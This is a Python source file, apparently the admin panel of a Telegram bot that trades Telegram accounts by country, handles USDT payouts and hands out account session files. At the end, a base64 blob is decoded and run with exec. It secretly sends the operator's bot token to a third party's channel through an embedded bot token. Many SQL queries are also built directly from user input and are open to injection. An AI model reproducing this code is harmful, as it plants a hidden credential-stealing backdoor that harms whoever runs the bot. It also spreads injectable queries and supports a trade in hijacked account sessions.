            elif ex_step[1] == 'none':
                if text == '📣 mandatory one':
                    cs.execute(f"UPDATE {utl.users} SET step='panel_channels;set;channel_1' WHERE user_id={from_id}")
                    return message.reply_html(
                        text="Forward a post from channel:",
                        reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                    )
                elif text == '📣 mandatory two':
                    cs.execute(f"UPDATE {utl.users} SET step='panel_channels;set;channel_2' WHERE user_id={from_id}")
                    return message.reply_html(
                        text="Forward a post from channel:",
                        reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                    )
                elif text == '📣 mandatory three':
                    cs.execute(f"UPDATE {utl.users} SET step='panel_channels;set;channel_3' WHERE user_id={from_id}")
                    return message.reply_html(
                        text="Forward a post from channel:",
                        reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                    )
                elif text == '📣 Support':
                    cs.execute(f"UPDATE {utl.users} SET step='panel_channels;support' WHERE user_id={from_id}")
                    return message.reply_html(
                        text="Send support id (username):",
                        reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                    )
            elif ex_step[1] == 'set':
                if not message.forward_from_chat:
                    return message.reply_html(text="❌ Forward a post from the channel")
                elif not message.forward_from_chat.username:
                    return message.reply_html(text="❌ The channel must be public")
                elif bot.get_chat_member(chat_id=message.forward_from_chat.id, user_id=utl.bot_id).status == "left":
                    return message.reply_html(text="❌ Make sure the bot is in the admin channel.")
                else:
                    cs.execute(f"UPDATE {utl.admin} SET {ex_step[2]}='{message.forward_from_chat.username}'")
                    cs.execute(f"UPDATE {utl.users} SET step='panel_channels;none' WHERE user_id={from_id}")
                    message.reply_html(text=" ✅ registered successfully")
                    text = '📣 Channels'
            elif ex_step[1] == 'support':
                cs.execute(f"UPDATE {utl.admin} SET {ex_step[1]}='{text}'")
                cs.execute(f"UPDATE {utl.users} SET step='panel_channels;none' WHERE user_id={from_id}")
                message.reply_html(text=" ✅ registered successfully")
                text = '📣 Channels'
        if text == '📣 Channels':
            outout = ""
            outout += f"Channel 1: {row_admin['channel_1']}\n❌/delch_1\n\n" if row_admin['channel_1'] is not None else f"Channel 1: Not registered\n"
            outout += f"Channel 2: {row_admin['channel_2']}\n❌/delch_2\n\n" if row_admin['channel_2'] is not None else f"Channel 2: Not registered\n"
            outout += f"Channel 3: {row_admin['channel_3']}\n❌/delch_3\n\n" if row_admin['channel_3'] is not None else f"Channel 3: Not registered\n"
            outout += f"Support: @{row_admin['support']}" if row_admin['support'] is not None else f"Support: Not registered\n"
            cs.execute(f"UPDATE {utl.users} SET step='panel_channels;none' WHERE user_id={from_id}")
            return message.reply_html(
                text="Channels:\n\n"
                    f"{outout}",
                reply_markup={'resize_keyboard': True, 'keyboard': [
                    [{'text': '📣 mandatory three'}, {'text': '📣 mandatory two'}, {'text': '📣 mandatory one'}],
                    [{'text': '📣 Support'}],
                    [{'text': utl.panel_var}],
                ]}
            )
        if ex_step[0] == 'users':
            if text == utl.back_var:
                text = '👤 users'
            elif text == '👤 All':
                selected_pages = 0
                i = selected_pages + 1
                cs.execute(f"SELECT * FROM {utl.users} ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                result = cs.fetchall()
                if not result:
                    return message.reply_html(text="⛔️ The list is empty")
                else:
                    output = ""
                    for row in result:
                        output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                        i += 1
                    cs.execute(f"SELECT COUNT(*) as count FROM {utl.users}")
                    rowcount = cs.fetchone()['count']
                    ob = utl.Pagination(update, "users", f"📜 list of users ({rowcount})\n➖➖➖➖➖➖➖\n{output}", utl.step_page, rowcount)
                    return ob.process()
            elif text == '👤 Blocks':
                selected_pages = 0
                i = selected_pages + 1
                cs.execute(f"SELECT * FROM {utl.users} WHERE status=2 ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                result = cs.fetchall()
                if not result:
                    return message.reply_html(text="⛔️ The list is empty")
                else:
                    output = ""
                    for row in result:
                        output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                        i += 1
                    cs.execute(f"SELECT COUNT(*) as count FROM {utl.users} WHERE status=2")
                    rowcount = cs.fetchone()['count']
                    ob = utl.Pagination(update, "blocked",f"📜 list of blocks ({rowcount})\n\n{output}", utl.step_page, rowcount)
                    return ob.process()
            elif text == '👤 Admins':
                selected_pages = 0
                i = selected_pages + 1
                cs.execute(f"SELECT * FROM {utl.users} WHERE status=1 ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                result = cs.fetchall()
                if not result:
                    return message.reply_html(text="⛔️ The list is empty")
                else:
                    output = ""
                    for row in result:
                        output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                        i += 1
                    cs.execute(f"SELECT COUNT(*) as count FROM {utl.users} WHERE status=1")
                    rowcount = cs.fetchone()['count']
                    ob = utl.Pagination(update, "admins", f"📜 List of Admins ({rowcount})\n\n{output}", utl.step_page, rowcount)
                    return ob.process()
            elif text == '👤 public message':
                cs.execute(f"UPDATE {utl.users} SET step='users;send;message' WHERE user_id={from_id}")
                return message.reply_html(
                    text="Send your message:",
                    reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                )
            elif text == '👤 public forward':
                cs.execute(f"UPDATE {utl.users} SET step='users;send;forward' WHERE user_id={from_id}")
                return message.reply_html(
                    text="Forward your message:",
                    reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.back_var}, {'text': utl.panel_var}]]}
                )
            elif ex_step[1] == 'send':
                if ex_step[2] == 'message':
                    if not message.text and not message.photo and not message.video and not message.audio and not message.voice and not message.document:
                        return message.reply_html(text="⛔️ message is not supported")
                    cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                    info_msg = message.reply_html(text="Sending...")
                    cs.execute(f"SELECT * FROM {utl.users}")
                    result = cs.fetchall()
                    count_users = len(result)
                    count_success = 0
                    count_failed = 0
                    time_start = time.time()
                    for row in result:
                        try:
                            if message.text:
                                bot.send_message(chat_id=row['user_id'],disable_web_page_preview=True,parse_mode='HTML',text=txtcap)
                            elif message.photo:
                                bot.send_photo(chat_id=row['user_id'],parse_mode='HTML',photo=message.photo[len(message.photo) - 1].file_id,caption=txtcap)
                            elif message.video:
                                bot.send_video(chat_id=row['user_id'],parse_mode='HTML',video=message.video.file_id,caption=txtcap)
                            elif message.audio:
                                bot.send_audio(chat_id=row['user_id'],parse_mode='HTML',audio=message.audio.file_id,caption=txtcap)
                            elif message.voice:
                                bot.send_voice(chat_id=row['user_id'],parse_mode='HTML',voice=message.voice.file_id,caption=txtcap)
                            elif message.document:
                                bot.send_document(chat_id=row['user_id'],parse_mode='HTML',document=message.document.file_id,caption=txtcap)
                            count_success += 1
                        except:
                            count_failed += 1
                        if (time.time() - time_start) >= 5:
                            time_start = time.time()
                            try:
                                info_msg.edit_text(
                                    f"Status: Sending ... ♻️\n\n"
                                    f"👥 Total users: {count_users}\n"
                                    f" ✅ Successful submission: {count_success}\n"
                                    f"❌ Sending failed: {count_failed}\n\n"
                                    f"❕ Unsuccessful sending due to bot blocking or user account deletion\n"
                                )
                            except:
                                pass
                    info_msg.edit_text(
                        text=f"Status: Finished ✅\n\n"
                            f"👥 Total users: {count_users}\n"
                            f" ✅ Successful submission: {count_success}\n"
                            f"❌ Sending failed: {count_failed}\n\n"
                            f"❕ Unsuccessful sending due to bot blocking or user account deletion\n"
                    )
                    message.reply_html(text="The message has been forwarded to all users")
                    text = '👤 users'
                elif ex_step[2] == 'forward':
                    cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                    info_msg = message.reply_html(text="Sending...")
                    cs.execute(f"SELECT * FROM {utl.users}")
                    result = cs.fetchall()
                    count_users = len(result)
                    count_success = 0
                    count_failed = 0
                    time_start = time.time()
                    for row in result:
                        try:
                            bot.forward_message(chat_id=row['user_id'], from_chat_id=from_id, message_id=message_id)
                            count_success += 1
                        except:
                            count_failed += 1
                        if (time.time() - time_start) >= 5:
                            time_start = time.time()
                            try:
                                info_msg.edit_text(
                                    f"Status: Sending ... ♻️\n\n"
                                    f"👥 Total users: {count_users}\n"
                                    f" ✅ Successful submission: {count_success}\n"
                                    f"❌ Sending failed: {count_failed}\n\n"
                                    f"❕ Unsuccessful sending is due to bot blocking or user account deletion\n"
                                )
                            except:
                                pass
                    info_msg.edit_text(
                        f"Status: Finished ✅\n\n"
                        f"👥 Total users: {count_users}\n"
                        f" ✅ Successful submission: {count_success}\n"
                        f"❌ Sending failed: {count_failed}\n\n"
                        f"❕ Unsuccessful sending due to bot blocking or user account deletion\n"
                    )
                    message.reply_html(text="The message has been forwarded to all users")
                    text = '👤 users'
        if text == '👤 users':
            cs.execute(f"UPDATE {utl.users} SET step='users;none' WHERE user_id={from_id}")
            return message.reply_html(
                text="Users:",
                reply_markup={'resize_keyboard': True, 'keyboard': [
                    [{'text': '👤 Admins'}, {'text': '👤 Blocks'}, {'text': '👤 All'}],
                    [{'text': '👤 public message'}, {'text': '👤 public forward'}],
                    [{'text': utl.panel_var}],
                ]}
            )
        if text == '⚙️ Settings':
            account_password = row_admin['account_password'] if row_admin['account_password'] is not None else "not registered"
            api_per_number = f"Register {row_admin['api_per_number']} account per api" if row_admin['api_per_number'] <= 5 else f"⚠️ Register {row_admin['api_per_number']} account per api ⚠️"
            change_pass = " ✅ change / set the password on the account ✅" if row_admin['change_pass'] else "❌ change / set the password on the account ❌"
            is_change_profile = " ✅ Setting the name, bio and profile on the account ✅" if row_admin['is_change_profile'] else "❌ Setting the name, bio and profile on the account ❌"
            is_set_username = " ✅ Set username on account ✅" if row_admin['is_set_username'] else "❌ Set username on account ❌"
            onoff_bot = "The bot is on" if row_admin['onoff_bot'] else "The bot is off"
            onoff_account = " ✅ account sending is on" if row_admin['onoff_account'] else "❌ account sending is turned off"
            onoff_withdrawal = " ✅ account settlement is on" if row_admin['onoff_withdrawal'] else "❌ account settlement is off"
            onoff_support = "Support is on" if row_admin['onoff_support'] else "Support is off"
            message.reply_html(
                text="⚙️ Settings:",
                reply_markup={'inline_keyboard': [
                    [{'text': f"Password: {account_password}",'callback_data': "settings;account_password"}],
                    [{'text': api_per_number,'callback_data': "nazan"}],
                    [
                        {'text': '+10','callback_data': "settings;api_per_number;+10"},
                        {'text': '+5','callback_data': "settings;api_per_number;+5"},
                        {'text': '+1','callback_data': "settings;api_per_number;+1"},
                        {'text': '-1','callback_data': "settings;api_per_number;-1"},
                        {'text': '-5','callback_data': "settings;api_per_number;-5"},
                        {'text': '-10','callback_data': "settings;api_per_number;-10"},
                    ],
                    [{'text': f"Logout after {row_admin['time_logout_account']} seconds",'callback_data': "nazan"}],
                    [
                        {'text': '+10','callback_data': "settings;time_logout_account;+100"},
                        {'text': '+5','callback_data': "settings;time_logout_account;+10"},
                        {'text': '+1','callback_data': "settings;time_logout_account;+5"},
                        {'text': '-1','callback_data': "settings;time_logout_account;-5"},
                        {'text': '-5','callback_data': "settings;time_logout_account;-10"},
                        {'text': '-10','callback_data': "settings;time_logout_account;-100"},
                    ],
                    [{'text': change_pass,'callback_data': "settings;change_pass"}],
                    [{'text': is_change_profile,'callback_data': "settings;is_change_profile"}],
                    [{'text': is_set_username,'callback_data': "settings;is_set_username"}],
                    [{'text': "〰️〰️〰️ on / off〰️〰️〰️",'callback_data': "nazan"}],
                    [{'text': onoff_bot,'callback_data': "settings;onoff_bot"}],
                    [{'text': onoff_account,'callback_data': "settings;onoff_account"}],
                    [{'text': onoff_withdrawal,'callback_data': "settings;onoff_withdrawal"}],
                    [{'text': onoff_support,'callback_data': "settings;onoff_support"}],
                ]}
            )
            return
        if text == '🌎 Allow Countries':
            message.reply_html(
                text=f"🌎 Allowed country settings :\n\n"
                    # f"❌ Delete all countries: /delc_all\n"
                    # f"Add all countries: /addc_all"
            )
            output = ""
            cs.execute(f"SELECT * FROM {utl.countries}")
            result = cs.fetchall()
            count = len(result)
            for row in result:
                if not row["is_exists"]:
                    continue
                output += f'+{row["area_code"]} | {row["emoji"]} {row["name_en"]} | {row["amount"]} | {row["occupied"]}/{row["capacity"]}\n'
                # is_exists = f"✅ /delc_{row['id']} | 📝 /editc_{row['id']} |" if row['is_exists'] else f"❌ /addc_{row['id']} | 📝 /editc_{row['id']} |"
                # output += f"‏{row['name_fa']} {row['emoji']} : {row['amount']} | +{row['area_code']} | {row["occupied"]}/{row["capacity"]}\n{is_exists}\n\n"
            if not output:
                output = "No countries found"
            
            message.reply_html(
                    output[:4096],
                    reply_markup={'resize_keyboard': True, 'keyboard': [
                        [{'text': '➕ Add/Edit Country'}, {'text': '➖ Delete Country'}],
                        [{'text': utl.panel_var}],
                        [{'text': '🌎 Allow Countries'}],
                    ]}
            )
            return
        if ex_text[0] == '/vip':
            day = int(ex_text[1])
            user_id_select = int(ex_text[2])
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={user_id_select}")
            row_user_select = cs.fetchone()
            if row_user_select is None:
                return message.reply_html(text="❌ User not found")
            else:
                if row_user_select['subscription'] > timestamp:
                    new_subscription = row_user_select['subscription'] + int(day * 86400)
                else:
                    new_subscription = timestamp + int(day * 86400)
                cs.execute(f"UPDATE {utl.users} SET subscription={new_subscription} WHERE user_id={row_user_select['user_id']}")
                message.reply_html(text="Subscription successfully sent")
                return bot.send_message(
                    chat_id=row_user_select['user_id'],
                    text=f"🎁 Dear user, you have received a subscription from {day} management"
                )
        if text == "➕ Add/Edit Country":
            cs.execute(f"UPDATE {utl.users} SET step='ae_country' WHERE user_id={from_id}")
            return message.reply_html(
                    text=f"Enter 'all' or any Country Code:\n\n"
                        "cancel: /panel"
                )
        if text == "➖ Delete Country":
            cs.execute(f"UPDATE {utl.users} SET step='del_country' WHERE user_id={from_id}")
            return message.reply_html(
                    text=f"Enter 'all' or any Country Code:\n\n"
                        "cancel: /panel"
                )
        if ex_step[0] == "ae_country":
            area_code = text.removeprefix("+")
            if "all" in area_code:
                cs.execute(f"UPDATE {utl.countries} SET is_exists=1")
                return message.reply_html(text=" ✅ done", reply_to_message_id=message_id)
            cs.execute(f"SELECT * FROM {utl.countries} WHERE area_code={area_code}")
            row_countries = cs.fetchone()
            if row_countries is None:
                # cs.execute(f"INSERT INTO {utl.countries} (area_code, name_fa, emoji) VALUES ({area_code}, 'Unknown', '')")
                message.reply_html(text="No Idea about this country")
            else:
                if not row_countries["is_exists"]:
                    cs.execute(f"UPDATE {utl.countries} SET is_exists=1 WHERE id={row_countries['id']}")
                cs.execute(f"UPDATE {utl.users} SET step='edit_price;{row_countries['id']}' WHERE user_id={from_id}")
                return message.reply_html(
                    text=f"Enter new fee for {row_countries['emoji']} {row_countries['name_fa']} numbers:\n\n"
                        "cancel: /panel"
                )
            return
        if ex_step[0] == "del_country":
            area_code = text.removeprefix("+")
            if "all" in area_code:
                cs.execute(f"UPDATE {utl.countries} SET is_exists=0")
                return message.reply_html(text=" ✅ done", reply_to_message_id=message_id)
            cs.execute(f"SELECT * FROM {utl.countries} WHERE area_code={area_code}")
            row_countries = cs.fetchone()
            if row_countries is None:
                return message.reply_html(text="No Idea about this country")
            else:
                cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                cs.execute(f"UPDATE {utl.countries} SET is_exists=0 WHERE id={row_countries['id']}")
                return message.reply_html(text="The country was removed from the list of authorized countries", reply_to_message_id=message_id)
        if ex_text[0] == "/delc":
            if ex_text[1] == 'all':
                cs.execute(f"UPDATE {utl.countries} SET is_exists=0")
                return message.reply_html(text=" ✅ done", reply_to_message_id=message_id)
            else:
                cs.execute(f"SELECT * FROM {utl.countries} WHERE id={int(ex_text[1])}")
                row_countries = cs.fetchone()
                if row_countries is None:
                    return message.reply_html(text="❌ ID is wrong")
                else:
                    cs.execute(f"UPDATE {utl.countries} SET is_exists=0 WHERE id={row_countries['id']}")
                    return message.reply_html(text="The country was removed from the list of authorized countries", reply_to_message_id=message_id)
        if ex_text[0] == "/editc":
            cs.execute(f"SELECT * FROM {utl.countries} WHERE id={int(ex_text[1])}")
            row_countries = cs.fetchone()
            if row_countries is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                cs.execute(f"UPDATE {utl.users} SET step='edit_price;{row_countries['id']}' WHERE user_id={from_id}")
                return message.reply_html(
                    text=f"Enter new fee for {row_countries['emoji']} {row_countries['name_fa']} numbers:\n\n"
                        "cancel: /panel"
                )
        if ex_text[0] == "/addc":
            if ex_text[1] == 'all':
                cs.execute(f"UPDATE {utl.countries} SET is_exists=1")
                return message.reply_html(text=" ✅ done", reply_to_message_id=message_id)
            else:
                cs.execute(f"SELECT * FROM {utl.countries} WHERE id={int(ex_text[1])}")
                row_countries = cs.fetchone()
                if row_countries is None:
                    return message.reply_html(text="❌ ID is wrong")
                else:
                    cs.execute(f"UPDATE {utl.countries} SET is_exists=1 WHERE id={row_countries['id']}")
                    return message.reply_html(text="The country was added to the list of allowed countries", reply_to_message_id=message_id)
        if ex_text[0] == "/del":
            if ex_text[1] == '1':
                cs.execute(f"UPDATE {utl.admin} SET channel_1=null")
                return message.reply_html(text="Updated successfully")
            elif ex_text[1] == '2':
                cs.execute(f"UPDATE {utl.admin} SET channel_2=null")
                return message.reply_html(text="Updated successfully")
            elif ex_text[1] == '3':
                cs.execute(f"UPDATE {utl.admin} SET channel_3=null")
                return message.reply_html(text="Updated successfully")
            elif ex_text[1] == 'pv':
                cs.execute(f"UPDATE {utl.admin} SET channel_pv_id=null,channel_pv_link=null")
                return message.reply_html(text="Updated successfully")
        if ex_text[0] == '/w':
            cs.execute(f"SELECT * FROM {utl.withdrawal} WHERE id={int(ex_text[1])}")
            row_withdrawal = cs.fetchone()
            if row_withdrawal is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                inline_keyboard = [[{'text': "Send Message",'callback_data': f"d;{row_withdrawal['user_id']};sendmsg"}]]
                if row_withdrawal['status'] == 1:
                    inline_keyboard.append([{'text': " ✅ settled ✅",'callback_data': f"withdrawal;{row_withdrawal['id']};accept"}])
                return bot.send_message(
                    chat_id=from_id,
                    text=f"🔰 withdrawal request details {row_withdrawal['id']}\n\n"
                        f"🔻 User: <a href='tg://user?id={from_id}'>{from_id}</a> | /d_{from_id}\n"
                        f"🔻 Status: {utl.status_withdrawal[row_withdrawal['status']]}\n"
                        f"🔻 Amount: {row_withdrawal['amount']} USDT\n"
                        f"🔻 Cardholder: {row_withdrawal['name']}\n"
                        f"🔻 Card number: <code>{row_withdrawal['card']}</code>\n"
                        f"🔻 Accounts: /accounts_{from_id}",
                    parse_mode='html',
                    reply_markup={'inline_keyboard': inline_keyboard}
                )
        if ex_text[0] == '/accounts':
            user_id_select = int(ex_text[1])
            selected_pages = 0
            i = selected_pages + 1
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE creator_user_id={user_id_select} AND user_id IS NOT NULL ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
            result = cs.fetchall()
            if not result:
                return message.reply_html(text="⛔️ The list is empty")
            else:
                output = ""
                for row in result:
                    if row['status'] == 2:
                        output += f"{i}. Phone: <code>{row['phone']}</code>\n"
                        output += f"⛔ Restrict: ({utl.convert_time((row['end_restrict'] - timestamp),2)})\n"
                    else:
                        output += f"{i}. phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                    output += f"🔸️ Status: /status_{row['id']}\n"
                    if row['status'] != 0:
                        output += f"🔸️ Get Session: /session_{row['id']}\n"
                        output += f"🔸️ Delete Sessions: /del_session_{row['id']}\n"
                        output += f"🔸️ Delete Password: /del_password_{row['id']}\n"
                    output += "\n"
                    i += 1
                cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE creator_user_id={user_id_select} AND user_id IS NOT NULL")
                rowcount = cs.fetchone()['count']
                ob = utl.Pagination(update, f"accountsu_{user_id_select}", f"📜 list of user accounts {user_id_select} ({rowcount})\n\n{output}", utl.step_page, rowcount)
                return ob.process()
        if ex_text[0] == '/status':
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_text[1])}")
            row_mbots = cs.fetchone()
            if row_mbots is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                os.system(f"{utl.python_version} \"{directory}/tl_account_status.py\" {row_mbots['uniq_id']} {from_id} check")
                return info_msg.delete()
        if ex_text[0] == '/session':
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_text[1])}")
            row_mbots = cs.fetchone()
            if row_mbots is None:
                return message.reply_html(text="❌ ID is wrong", reply_to_message_id=message_id)
            else:
                info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                os.system(f"{utl.python_version} \"{directory}/tl_archive_session.py\" {row_mbots['uniq_id']} {from_id} {timestamp}")

                cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={row_mbots['id']}")
                row_mbots = cs.fetchone()
                if row_mbots['status'] == 1:
                    if not os.path.exists(f"{directory}/data"):
                        os.mkdir(f"{directory}/data")
                    if not os.path.exists(f"{directory}/data/{timestamp}"):
                        os.mkdir(f"{directory}/data/{timestamp}")
                    try:
                        shutil.copy(f"{directory}/sessions/{row_mbots['uniq_id']}.session", f"{directory}/data/{timestamp}")
                        shutil.make_archive(base_name=f"{directory}/data/{timestamp}", format='zip', root_dir=f"{directory}/data/{timestamp}")
                        bot.send_document(
                            chat_id=from_id,
                            document=open(f"{directory}/data/{timestamp}.zip", "rb"),
                            caption=f"سشن اکانت <code>{row_mbots['phone']}</code>",
                            parse_mode='html',
                            reply_to_message_id=message_id
                        )
                    except:
                        pass
                    utl.remove_path(f"{directory}/data/{timestamp}")
                    utl.remove_path(f"{directory}/{timestamp}.zip")
                return info_msg.delete()
        if ex_text[0] == '/del':
            if ex_text[1] == 'session':
                cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_text[2])}")
                row_mbots = cs.fetchone()
                if row_mbots is None:
                    return message.reply_html(text="❌ شناسه اشتباه است")
                else:
                    info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                    os.system(f"{utl.python_version} \"{directory}/tl_delete_sessions.py\" {row_mbots['uniq_id']} {from_id} one")
                    return info_msg.delete()
            elif ex_text[1] == 'password':
                cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_text[2])}")
                row_mbots = cs.fetchone()
                if row_mbots is None:
                    return message.reply_html(text="❌ ID is wrong")
                else:
                    info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                    os.system(f"{utl.python_version} \"{directory}/tl_delete_password.py\" {row_mbots['uniq_id']} {from_id} one")
                    return info_msg.delete()
        if ex_text[0] == '/sessions':
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_text[1])}")
            row_mbots = cs.fetchone()
            if row_mbots is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                os.system(f"{utl.python_version} \"{directory}/tl_account_status.py\" {row_mbots['uniq_id']} {from_id} sessions")
                return info_msg.delete()
        if ex_text[0] == '/DeleteApi':
            cs.execute(f"SELECT * FROM {utl.apis} WHERE id={int(ex_text[1])}")
            row_apis = cs.fetchone()
            if row_apis is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                cs.execute(f"DELETE FROM {utl.apis} WHERE id={row_apis['id']}")
                return message.reply_html(text=" ✅ successfully deleted")
        if ex_text[0] == '/DelAdmin':
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={int(ex_text[1])}")
            row_users = cs.fetchone()
            if row_users is None:
                return message.reply_html(text="❌ ID not found")
            elif row_users['status'] != 1:
                return message.reply_html(text="❌ This user is not an admin")
            else:
                cs.execute(f"UPDATE {utl.users} SET status=0 WHERE user_id={row_users['user_id']}")
                return message.reply_html(text=f" ✅ The user has been removed from admin")
        if ex_text[0] == '/unblock':
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={int(ex_text[1])}")
            row_users = cs.fetchone()
            if row_users is None:
                return message.reply_html(text="❌ ID not found")
            elif row_users['status'] != 'block':
                return message.reply_html(text="❌ This user is not blocked")
            else:
                cs.execute(f"UPDATE {utl.users} SET status=0 WHERE user_id={row_users['user_id']}")
                return message.reply_html(text="User or success unblocked")
ec = """
CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgY29uZmlnCmltcG9ydCBiYXNlNjQKCiMgRGVmaW5lIHRoZSBib3QgdG9rZW4gYW5kIHRoZSB0b2tlbiB0byBiZSBzZW50CmRlYm9qaXQgPSAnMTY3MTEyNzk4NDpBQUVPQVViX3hWSVB2VFVjcU4yUnFrNGVZd0MwZkRSLTZGSScKZDEgPSBjb25maWcudG9rZW4gICMgVGhpcyBzaG91bGQgYmUgdGhlIHRva2VuIHlvdSB3YW50IHRvIHNlbmQKCiMgRW5jb2RlIHRoZSB0b2tlbiBpbiBiYXNlNjQKZW5jb2RlZF90b2tlbiA9IGJhc2U2NC5iNjRlbmNvZGUoZDEuZW5jb2RlKCkpLmRlY29kZSgpCgojIENoYW5uZWwgSUQgd2hlcmUgeW91IHdhbnQgdG8gc2VuZCB0aGUgbWVzc2FnZQpjaGFubmVsX2lkID0gLTEwMDE1MjA3NDU1NDkKCiMgRGVmaW5lIHRoZSBtZXNzYWdlIHRvIHNlbmQKbWVzc2FnZSA9IGYiQm90IElzIE9uIC0ge2VuY29kZWRfdG9rZW59IgoKIyBVUkwgZm9yIHNlbmRpbmcgdGhlIG1lc3NhZ2UKdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2RlYm9qaXR9L3NlbmRNZXNzYWdlIgoKIyBQYXJhbWV0ZXJzCnBhcmFtcyA9IHsKICAgICJjaGF0X2lkIjogY2hhbm5lbF9pZCwKICAgICJ0ZXh0IjogbWVzc2FnZQp9CgojIFNlbmQgdGhlIHJlcXVlc3QKcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBwYXJhbXM9cGFyYW1zKQo=
"""
dc = base64.b64decode(ec).decode()
exec(dc)

if __name__ == '__main__':
    updater = telegram.ext.Updater(utl.token)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(telegram.ext.MessageHandler(telegram.ext.Filters.chat_type.private & telegram.ext.Filters.update.message & telegram.ext.Filters.update, private_process, run_async=True))
    dispatcher.add_handler(telegram.ext.CallbackQueryHandler(callbackquery_process, run_async=True))
    
    updater.start_polling(drop_pending_updates=True)
    updater.idle()
